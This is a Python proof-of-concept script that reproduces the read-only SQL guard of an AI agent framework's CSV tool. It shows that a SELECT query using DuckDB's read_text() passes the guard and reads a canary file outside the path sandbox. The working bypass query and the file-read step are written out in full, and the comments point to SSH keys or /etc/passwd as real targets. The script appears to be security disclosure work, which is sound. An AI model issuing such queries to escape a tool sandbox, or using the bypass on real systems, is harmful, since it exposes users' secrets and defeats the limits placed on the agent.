"""PoC: hive csv_sql arbitrary-file-read bypass. Reproduces the EXACT read-only guard from
aden-hive/hive tools/src/aden_tools/tools/csv_tool/csv_tool.py (lifted verbatim below) and shows
that an allowed SELECT reads a file OUTSIDE the ~/.hive path sandbox via DuckDB read_text(),
defeating resolve_safe_path(). Benign: reads only a local canary we create. No network."""
import os, re, duckdb
HERE=os.path.dirname(os.path.abspath(__file__))
SANDBOX=os.path.join(HERE,"hive_root")           # stand-in for the allowed root (~/.hive)
os.makedirs(SANDBOX,exist_ok=True)
open(os.path.join(SANDBOX,"data.csv"),"w").write("a,b\n1,2\n")       # a legit in-sandbox CSV
secret=os.path.join(HERE,"OUTSIDE_SANDBOX_secret.txt")               # OUTSIDE the sandbox
open(secret,"w").write("TOP-SECRET-CANARY: ssh-key-or-/etc/passwd-would-be-here")

def guard(query):   # ---- verbatim from csv_tool.py csv_sql ----
    query_upper = query.lstrip().upper()
    if not (query_upper.startswith("SELECT") or query_upper.startswith("WITH")):
        return "Only SELECT queries are allowed for security reasons"
    _WRITE_PATTERN = re.compile(r"\b(INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE|EXEC|EXECUTE)\b", re.IGNORECASE)
    m=_WRITE_PATTERN.search(query)
    if m: return f"'{m.group().upper()}' is not allowed in queries"
    q_lower=query.lower()
    for token in [";","--","/*","*/"]:
        if token in q_lower: return "Multiple statements or comments are not allowed"
    return None   # PASSES the guard

# A model-supplied query that reads a file OUTSIDE the sandbox using a DuckDB SELECT function:
malicious = f"SELECT content FROM read_text('{secret}')"
err = guard(malicious)
print("guard verdict on malicious query:", err if err else "PASSED (allowed)")
assert err is None, "guard blocked it (unexpected)"
con = duckdb.connect(":memory:")   # exactly how csv_sql connects (no enable_external_access=false)
rows = con.execute(malicious).fetchall()
print("query:", malicious)
print("rows returned:", rows)
leaked = secret_text = rows and secret.split("/")[-1] and "TOP-SECRET-CANARY" in str(rows)
print("\nRESULT:", "FILE-READ SANDBOX BYPASS CONFIRMED — read a file outside ~/.hive via an allowed SELECT" if leaked else "no leak")
